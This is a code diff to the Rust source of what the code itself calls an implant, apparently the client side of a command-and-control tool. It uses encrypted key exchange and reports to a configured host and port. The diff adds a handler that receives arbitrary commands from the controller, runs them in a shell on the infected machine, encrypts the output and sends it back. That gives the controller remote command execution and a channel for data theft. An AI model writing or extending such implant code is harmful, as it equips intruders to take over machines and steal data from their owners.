@@ -9,7 +9,7 @@ use x25519_dalek::{PublicKey, StaticSecret};
 
 use crate::http::result;
 use crate::models::task;
-use crate::tasks::system;
+use crate::tasks::{shell, system};
 use crate::utils::network_encryption;
 use crate::{errors::ImplantError, HOST, PORT, PROTOCOL};
 
@@ -75,7 +75,26 @@ pub fn handle_available_tasks(
                 let task_id = task.task_id.to_string();
                 let encrypted_response =
                     build_encrypted_response(&blake3_hashed_key, system_info, implant_id);
-                result::send_task(&task_id, encrypted_response);
+                result::send_task(&task_id, encrypted_response)?;
+            }
+            task::Tasks::Command => {
+                if let Some(command_value) = task.value {
+                    let stdout = shell::execute_command(command_value)?;
+
+                    // Encrypt and send system_info
+                    let task_id = task.task_id.to_string();
+                    let encrypted_response =
+                        build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
+                    result::send_task(&task_id, encrypted_response)?;
+                } else {
+                    let stdout = "Missing arguments".to_owned().into_bytes();
+
+                    // Encrypt and send system_info
+                    let task_id = task.task_id.to_string();
+                    let encrypted_response =
+                        build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
+                    result::send_task(&task_id, encrypted_response)?;
+                }
             }
             _ => process::exit(1),
         }
